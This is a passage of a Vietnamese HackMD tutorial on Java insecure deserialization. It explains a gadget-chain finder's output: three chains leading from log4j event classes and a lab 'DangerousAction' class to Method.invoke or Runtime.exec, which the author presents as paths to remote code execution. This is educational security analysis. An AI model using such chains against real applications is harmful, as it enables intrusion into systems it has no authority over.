ui-code-block-zoom-button ui-code-block-toolbar-type-image" data-state="closed"><i class="inline-flex ph ph-magnifying-glass-plus" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div><img src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/rJHz5pYuge.png" alt="image" class="offline-handled error-handled image-toolbar-handled" data-position="57844" data-size="51" loading="lazy" style="width: auto; height: auto;"></span></p><p class="part" data-startline="835" data-endline="835" data-position="57897" data-size="0"><span data-position="57897" data-size="59">Từ thông báo trả về sau khi chạy thì ta có thông báo là có </span><strong data-position="57956" data-size="0"><span data-position="57958" data-size="14">3 gadget chain</span></strong><span data-position="57974" data-size="100"> tìm được và trả thêm một số file, nhưng hiện giờ mình chỉ đi cơ bản của tool này thì quan tâm file </span><strong data-position="58074" data-size="0"><span data-position="58076" data-size="17">gadget-chains.txt</span></strong><span data-position="58095" data-size="30"> là được và nó có nội dung là:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="836" data-endline="847" data-infoprefix-length="4" data-position="58126"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="code hljs">org<span class="hljs-operator">/</span>apache<span class="hljs-operator">/</span>log4j<span class="hljs-operator">/</span>pattern<span class="hljs-operator">/</span>LogEvent.readObject(Ljava<span class="hljs-operator">/</span>io<span class="hljs-operator">/</span>ObjectInputStream;)V (<span class="hljs-number">1</span>)
  org<span class="hljs-operator">/</span>apache<span class="hljs-operator">/</span>log4j<span class="hljs-operator">/</span>pattern<span class="hljs-operator">/</span>LogEvent.readLevel(Ljava<span class="hljs-operator">/</span>io<span class="hljs-operator">/</span>ObjectInputStream;)V (<span class="hljs-number">1</span>)
  java<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>reflect<span class="hljs-operator">/</span>Method.invoke(Ljava<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>Object;[Ljava<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>Object;)Ljava<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>Object; (<span class="hljs-number">0</span>)

org<span class="hljs-operator">/</span>apache<span class="hljs-operator">/</span>log4j<span class="hljs-operator">/</span>spi<span class="hljs-operator">/</span>LoggingEvent.readObject(Ljava<span class="hljs-operator">/</span>io<span class="hljs-operator">/</span>ObjectInputStream;)V (<span class="hljs-number">1</span>)
  org<span class="hljs-operator">/</span>apache<span class="hljs-operator">/</span>log4j<span class="hljs-operator">/</span>spi<span class="hljs-operator">/</span>LoggingEvent.readLevel(Ljava<span class="hljs-operator">/</span>io<span class="hljs-operator">/</span>ObjectInputStream;)V (<span class="hljs-number">1</span>)
  java<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>reflect<span class="hljs-operator">/</span>Method.invoke(Ljava<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>Object;[Ljava<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>Object;)Ljava<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>Object; (<span class="hljs-number">0</span>)

com<span class="hljs-operator">/</span>example<span class="hljs-operator">/</span>vuln<span class="hljs-operator">/</span>DangerousAction.readObject(Ljava<span class="hljs-operator">/</span>io<span class="hljs-operator">/</span>ObjectInputStream;)V (<span class="hljs-number">1</span>)
  java<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>Runtime.exec(Ljava<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>String;)Ljava<span class="hljs-operator">/</span>lang<span class="hljs-operator">/</span>Process; (<span class="hljs-number">1</span>)
</code></pre>
      </div><p class="part" data-startline="848" data-endline="848" data-position="58794" data-size="0"><span data-position="58794" data-size="51">thì giờ mình sẽ phân tích cấu trúc của nó, thì mỗi </span><strong data-position="58845" data-size="0"><span data-position="58847" data-size="5">block</span></strong><span data-position="58854" data-size="14"> ở đây là một </span><strong data-position="58868" data-size="0"><span data-position="58870" data-size="12">gadget chain</span></strong><span data-position="58884" data-size="70"> và nó được ngăn cách với nhau bằng dấu cách. Mỗi dòng đầu tiên trong </span><strong data-position="58954" data-size="0"><span data-position="58956" data-size="5">block</span></strong><span data-position="58963" data-size="7"> là là </span><strong data-position="58970" data-size="0"><span data-position="58972" data-size="11">entry point</span></strong><span data-position="58986" data-size="72">(phương thức có thể bị gọi khi deserialization diễn ra), nó có cấu trúc:</span></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="849" data-endline="852" data-infoprefix-length="4" data-position="59058"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs">    <span class="token generics"><span class="token punctuation">&lt;</span><span class="token keyword">package</span><span class="token punctuation">&gt;</span></span><span class="token operator">/</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token keyword">class</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">.</span><span class="token generics"><span class="token punctuation">&lt;</span>method<span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token generics"><span class="token punctuation">&lt;</span>method_signature<span class="token punctuation">&gt;</span></span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>

</code></pre>
      </div><p class="part" data-startline="853" data-endline="853" data-position="59126" data-size="0"><span data-position="59126" data-size="12">còn kí hiệu </span><code data-position="59141" data-size="3">(1)</code><span data-position="59147" data-size="33"> nghĩa là phương thức này có thể </span><strong data-position="59180" data-size="0"><span data-position="59182" data-size="51">nhận dữ liệu từ đối tượng được deserialize (Source)</span></strong><span data-position="59236" data-size="68">. Các dòng tiếp theo là luồng thực thi tiếp theo và dòng cuối sẽ là </span><strong data-position="59303" data-size="0"><span data-position="59305" data-size="4">Sink</span></strong><span data-position="59312" data-size="1">.</span></p><p class="part" data-startline="855" data-endline="856" data-position="59322" data-size="0"><span data-position="59322" data-size="42">Để hiểu rõ hơn giờ mình sẽ phân tích cả 3 </span><strong data-position="59364" data-size="0"><span data-position="59366" data-size="5">Chain</span></strong><span data-position="59374" data-size="1">:</span><br>
<strong data-position="59375" data-size="0"><span data-position="59377" data-size="8">Chain 1:</span></strong></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="857" data-endline="861" data-infoprefix-length="4" data-position="59388"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs">org<span class="token operator">/</span>apache<span class="token operator">/</span>log4j<span class="token operator">/</span>pattern<span class="token operator">/</span><span class="token class-name">LogEvent</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>io<span class="token operator">/</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  org<span class="token operator">/</span>apache<span class="token operator">/</span>log4j<span class="token operator">/</span>pattern<span class="token operator">/</span><span class="token class-name">LogEvent</span><span class="token punctuation">.</span><span class="token function">readLevel</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>io<span class="token operator">/</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  java<span class="token operator">/</span>lang<span class="token operator">/</span>reflect<span class="token operator">/</span><span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Object</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Object</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Object</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre>
      </div><ul class="part" data-startline="862" data-endline="864" data-position="59654" data-size="0">
<li class="" data-startline="862" data-endline="862" data-position="59656" data-size="0"><span data-position="59656" data-size="13">Entry point: </span><code data-position="59672" data-size="19">LogEvent.readObject</code><span data-position="59694" data-size="14"> được gọi khi </span><strong data-position="59708" data-size="0"><span data-position="59710" data-size="11">deserialize</span></strong><span data-position="59723" data-size="11"> đối tượng </span><code data-position="59737" data-size="8">LogEvent</code><span data-position="59748" data-size="4"> từ </span><code data-position="59755" data-size="5">Log4j</code></li>
<li class="" data-startline="863" data-endline="864" data-position="59766" data-size="0"><span data-position="59766" data-size="19">Rồi từ đây gọi tới </span><code data-position="59788" data-size="9">readLevel</code><span data-position="59801" data-size="23">, và tiếp tục gọi được </span><code data-position="59826" data-size="13">Method.invoke</code><span data-position="59843" data-size="133">(reflection), cho phép thực thi hàm tùy ý, rồi từ đây bạn có thể kiếm các hàm mà mình muốn vì bây giờ mình có thể thực thi tùy ý rồi.</span></li>
</ul><p class="part" data-startline="865" data-endline="865" data-position="59977" data-size="0"><strong data-position="59977" data-size="0"><span data-position="59979" data-size="8">Chain 2:</span></strong></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="866" data-endline="870" data-infoprefix-length="4" data-position="59990"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs">org<span class="token operator">/</span>apache<span class="token operator">/</span>log4j<span class="token operator">/</span>spi<span class="token operator">/</span><span class="token class-name">LoggingEvent</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>io<span class="token operator">/</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  org<span class="token operator">/</span>apache<span class="token operator">/</span>log4j<span class="token operator">/</span>spi<span class="token operator">/</span><span class="token class-name">LoggingEvent</span><span class="token punctuation">.</span><span class="token function">readLevel</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>io<span class="token operator">/</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  java<span class="token operator">/</span>lang<span class="token operator">/</span>reflect<span class="token operator">/</span><span class="token class-name">Method</span><span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Object</span><span class="token punctuation">;</span><span class="token punctuation">[</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Object</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Object</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
</code></pre>
      </div><ul class="part" data-startline="871" data-endline="873" data-position="60256" data-size="0">
<li class="" data-startline="871" data-endline="871" data-position="60258" data-size="0"><span data-position="60258" data-size="55">Entry point: LoggingEvent.readObject cũng được gọi khi </span><strong data-position="60313" data-size="0"><span data-position="60315" data-size="11">deserialize</span></strong><span data-position="60328" data-size="11"> đối tượng </span><code data-position="60342" data-size="8">LogEvent</code><span data-position="60353" data-size="4"> từ </span><code data-position="60360" data-size="5">Log4j</code><span data-position="60369" data-size="1">.</span></li>
<li class="" data-startline="872" data-endline="873" data-position="60372" data-size="0"><span data-position="60372" data-size="53">Thì chain này cũng tương tự chain 1 nhưng khác class(</span><code data-position="60428" data-size="16">spi.LoggingEvent</code><span data-position="60447" data-size="9"> thay vì </span><code data-position="60459" data-size="16">pattern.LogEvent</code><span data-position="60478" data-size="1">)</span></li>
</ul><p class="part" data-startline="874" data-endline="874" data-position="60488" data-size="0"><strong data-position="60488" data-size="0"><span data-position="60490" data-size="8">Chain 3:</span></strong></p><div class="part code-block-wrapper code-block-toolbar-handled" data-startline="875" data-endline="878" data-infoprefix-length="4" data-position="60501"><div class="code-toolbar"><div class="flex flex-row gap-0.5 rounded-lg bg-element-bg-default px-[7px] py-[5px]"><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-link-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-link" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button><button class="rounded text-lg font-normal leading-sm flex bg-transparent text-text-default border border-solid border-transparent hocus:bg-element-bg-hover hocus:text-text-emphasize hover:border-element-bg-hover focus:shadow-[0_0_0_2px_#77777733] focus:border-element-border-hover disabled:bg-transparent disabled:hocus:bg-transparent disabled:hocus:border-transparent disabled:text-element-text-disabled disabled:hocus:text-element-text-disabled p-0.5 ui-code-block-copy-button ui-code-block-toolbar-type-code" data-state="closed"><i class="inline-flex ph ph-clipboard-text" aria-hidden="true" style="width: 20px; height: 20px; font-size: 20px; line-height: 20px;"></i></button></div></div>
        <pre class="click-event-handled"><code class="java hljs">com<span class="token operator">/</span>example<span class="token operator">/</span>vuln<span class="token operator">/</span><span class="token class-name">DangerousAction</span><span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>io<span class="token operator">/</span><span class="token class-name">ObjectInputStream</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">V</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
  java<span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">String</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token class-name">Ljava</span><span class="token operator">/</span>lang<span class="token operator">/</span><span class="token class-name">Process</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
</code></pre>
      </div><p class="part" data-startline="879" data-endline="879" data-position="60659" data-size="0"><span data-position="60659" data-size="95">Chain này mình đã làm và phân tích ngay từ đầu thì mình sẽ không phân tích sâu nữa, thì vẫn là:</span></p><ul class="part" data-startline="880" data-endline="883" data-position="60755" data-size="0">
<li class="" data-startline="880" data-endline="880" data-position="60757" data-size="0"><span data-position="60757" data-size="59">Entry point: DangerousAction.readObject (class của server).</span></li>
<li class="" data-startline="881" data-endline="881" data-position="60819" data-size="0"><span data-position="60819" data-size="22">Sau đấy gọi trực tiếp </span><code data-position="60844" data-size="12">Runtime.exec</code><span data-position="60859" data-size="30"> với input từ serialized data.</span></li>
<li class="" data-startline="882" data-endline="883" data-position="60892" data-size="0"><span data-position="60893" data-size="93">(1) ở cuối nghĩa là dữ liệu người dùng truyền vào exec trực tiếp từ input có nghĩa ta có thể </span><strong data-position="60985" data-size="0"><span data-position="60987" data-size="9">RCE tùy ý</span></strong><span data-position="60999" data-size="1">.</span></li>
</ul><p class="part" data-startline="884" data-endline="884" data-position="61001" data-size="0"><span data-position="61001" data-size="6">Thì ở </span><strong data-position="61007" data-size="0"><span data-position="61009" data-size="7">Chain 1</span></strong><span data-position="61018" data-size="4"> và </span><strong data-position="61022" data-size="0"><span data-position="61024" data-size="7">Chain 2</span></strong><span data-position="61033" data-size="87"> là 2 chain tiềm ẩn khả năng RCE, chúng ta vẫn phải tự hoàn thiện thêm không giống như </span><strong data-position="61120" data-size="0"><span data-position="61122" data-size="7">Chain 3</span></strong><span data-position="61132" data-size="1">.</span></p><p class="part" data-startline="886" data-endline="886" data-position="61142" data-size="0"><span data-position="61142" data-size="91">Mặc dù tool này khá hữu ích nhưng vẫn có khả năng thiếu sót chain ví dụ như không tìm thấy </span><strong data-position="61233" data-size="0"><span data-position="61235" data-size="3">CC6</span></strong><span data-position="61240" data-size="97"> ở ví dụ thứ 2 của mình và các bạn cũng nên test lại các Gadget này, và đôi khi phải tự xác định </span><strong data-position="61337" data-size="0"><span data-position="61339" data-size="6">Source</span></strong><span data-position="61347" data-size="4"> và </span><strong data-position="61351" data-size="0"><span data-position="61353" data-size="4">Sink</span></strong><span data-position="61359" data-size="56"> bằng thủ công, không nên quá phụ thuộc vào công cụ này.</span></p></div></div><div class="document-footer container-fluid hmd-pb-2 hidden-print"><div class="-mb-5 flex items-center justify-end text-right text-3 text-text-subtle"><span>Last changed by&nbsp;</span><span class="ui-lastchangeuser h-[18px]" data-profile="nhat015" data-placement="left" data-name="ASEN"><a class="ui-user-icon m-0 inline-block h-[18px] w-[18px] user-card-popover" target="_blank" href="https://hackmd.io/@nhat015" data-toggle="popover" style="background-image: url(&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PHN2ZyB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSI5NiIgd2lkdGg9Ijk2IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA5NiA5NiI+PGc+PHJlY3Qgd2lkdGg9Ijk2IiBoZWlnaHQ9Ijk2IiBmaWxsPSIjYzYzZjU2IiAvPjx0ZXh0IGZvbnQtc2l6ZT0iNjRweCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiNmZmZmZmYiPjx0c3BhbiB4PSI0OCIgeT0iNzIiIHN0cm9rZS13aWR0aD0iLjI2NDU4cHgiIGZpbGw9IiNmZmZmZmYiPkE8L3RzcGFuPjwvdGV4dD48L2c+PC9zdmc+&quot;);" data-original-title="" title=""></a></span></div><hr class="my-[30px]"><div class="footer hmd-items-center flex flex-col-reverse gap-[25px] sm:flex-row sm:gap-0"><div class="block h-full flex-1"><div class="relative flex gap-3 text-text-subtle"><span class="flex items-start justify-center ui-owner" data-placement="top" data-profile="nhat015"> <a class="ui-user-icon m-0 inline-block h-10 w-10 min-w-10 user-card-popover" target="_blank" href="https://hackmd.io/@nhat015" data-toggle="popover" style="background-image: url(&quot;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiIHN0YW5kYWxvbmU9Im5vIj8+PHN2ZyB4bWxuczpyZGY9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkvMDIvMjItcmRmLXN5bnRheC1ucyMiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgaGVpZ2h0PSI5NiIgd2lkdGg9Ijk2IiB2ZXJzaW9uPSIxLjEiIHZpZXdCb3g9IjAgMCA5NiA5NiI+PGc+PHJlY3Qgd2lkdGg9Ijk2IiBoZWlnaHQ9Ijk2IiBmaWxsPSIjYzYzZjU2IiAvPjx0ZXh0IGZvbnQtc2l6ZT0iNjRweCIgZm9udC1mYW1pbHk9InNhbnMtc2VyaWYiIHRleHQtYW5jaG9yPSJtaWRkbGUiIGZpbGw9IiNmZmZmZmYiPjx0c3BhbiB4PSI0OCIgeT0iNzIiIHN0cm9rZS13aWR0aD0iLjI2NDU4cHgiIGZpbGw9IiNmZmZmZmYiPkE8L3RzcGFuPjwvdGV4dD48L2c+PC9zdmc+&quot;);" data-original-title="" title=""></a></span><div class="flex max-w-[303px] flex-col items-start justify-center gap-1.5"><div class="w-full break-words"><a class="cursor-pointer text-normal font-semibold leading-normal text-text-emphasize hocus:text-link-text-hover hocus:underline ui-owner user-card-popover" data-placement="top" data-profile="nhat015" href="https://hackmd.io/@nhat015" data-toggle="popover" data-original-title="" title="">ASEN</a><div class="follow-button-container inline" data-signin="false"><span class="mx-1"><span class="mr-1">·</span><button class="bg-transparent border-none p-0 font-semibold text-text-subtle ui-signin">Follow</button></span></div></div><span class="w-full break-words text-sm text-text-subtle">Student, Web player</span></div></div></div><div class="footer__views"><div class="flex flex-col gap-2.5"><div class="flex flex-row justify-around gap-[7px]"><div class="community-button ui-comment-counts flex items-center justify-center gap-[5px] text-5" title="" data-toggle="tooltip" data-placement="top" data-offset="0,5" data-original-title="0 comments"><i class="ph-fill ph-chat-circle-dots"></i><span>0</span></div><a class="community-button" title="" data-toggle="tooltip" data-placement="top" data-offset="0,5" type="button" href="https://hackmd.io/@nhat015/HktihBmLxl#" data-original-title="Like"><i class="ph ph-heart"></i><span class="count"></span></a><div class="community-button ui-viewcount" title="" data-toggle="tooltip" data-placement="top" data-offset="0,5" data-original-title="576 views"><i class="ph ph-eye"></i><span class="count">576</span></div><a class="community-button" title="" data-toggle="tooltip" data-placement="top" data-offset="0,5" type="button" href="https://hackmd.io/@nhat015/HktihBmLxl#" data-original-title="Bookmark"><i class="ph ph-bookmark-simple"></i></a></div></div></div></div><section id="notes-recommendations"></section><hr class="mt-7.5 mb-3.5"><div class="footer text-center text-sm leading-sm text-text-subtle"><span>Published on</span> <strong><a href="https://hackmd.io/" target="_blank"><img class="h-5 w-auto" src="./Những điểu về lỗ hổng Java Deserialization vulnerability - HackMD_files/Logo.svg"> <span class="brand">HackMD</span></a></strong></div></div><div class="ui-community unselectable hidden-print hidden-xs" style="visibility: visible; left: 348.4px;"><a class="community-button" title="" data-toggle="tooltip" data-placement="right" data-offset="0,5" type="button" href="https://hackmd.io/@nhat015/HktihBmLxl#" data-original-title="Like"><i class="ph ph-heart"></i><span class="count"></span></a><a class="community-button" title="" data-toggle="tooltip" data-placement="right" data-offset="0,5" type="button" href="https://hackmd.io/@nhat015/HktihBmLxl#" data-original-title="Bookmark"><i class="ph ph-bookmark-simple"></i></a><a class="community-button" href="https://hackmd.io/@nhat015/HktihBmLxl#"><i class="ph ph-bell"></i></a></div><div class="ui-toc dropup unselectable hidden-print" style="display: none; left: 348.45px; visibility: visible;"><div class="pull-left dropdown"><a id="tocLabel" class="ui-toc-label btn btn-default" data-toggle="dropdown" href="https://hackmd.io/@nhat015/HktihBmLxl#" role="button" aria-haspopup="true" aria-expanded="false" title="Table of content"><i class="fa fa-bars"></i></a><ul id="ui-toc" class="ui-toc-dropdown dropdown-menu" aria-labelledby="tocLabel" lang="vi-VN" dir="ltr"><div class="toc"><ul class="nav">
<li class="active"><a href="https://hackmd.io/@nhat015/HktihBmLxl#Nh%E1%BB%AFng-%C4%91i%E1%BB%83u-v%E1%BB%81-l%E1%BB%97-h%E1%BB%95ng-Java-Deserialization-vulnerability" title="Những điểu về lỗ hổng Java Deserialization vulnerability" smoothhashscroll="">Những điểu về lỗ hổng Java Deserialization vulnerability</a><ul class="nav">
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#M%E1%BB%A5c-l%E1%BB%A5c" title="Mục lục" smoothhashscroll="">Mục lục</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#I-L%C3%9D-THUY%E1%BA%BET" title="I. LÝ THUYẾT" smoothhashscroll="">I. LÝ THUYẾT</a><ul class="nav">
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#1-M%E1%BB%99t-s%E1%BB%91-kh%C3%A1i-ni%E1%BB%87m-c%C6%A1-b%E1%BA%A3n" title="1. Một số khái niệm cơ bản" smoothhashscroll="">1. Một số khái niệm cơ bản</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#2-Ki%E1%BA%BFn-th%E1%BB%A9c-n%E1%BB%81n" title="2. Kiến thức nền" smoothhashscroll="">2. Kiến thức nền</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#3-Insecure-Deserialization-l%C3%A0-g%C3%AC" title="3. Insecure Deserialization là gì" smoothhashscroll="">3. Insecure Deserialization là gì</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#4-L%C3%BD-do-l%E1%BB%97-h%E1%BB%95ng-Insecure-Deserialization-ph%C3%A1t-sinh" title="4. Lý do lỗ hổng Insecure Deserialization phát sinh?" smoothhashscroll="">4. Lý do lỗ hổng Insecure Deserialization phát sinh?</a></li>
<li class=""><a href="https://hackmd.io/@nhat015/HktihBmLxl#5-H%E1%BA%ADu-qu%E1%BA%A3-c%E1%BB%A7a-Insecure-Deserialization" title="5. Hậu quả của Insecure Deserialization" smoothhashscroll="">5. Hậu quả của Insecure Deserialization</a></li>
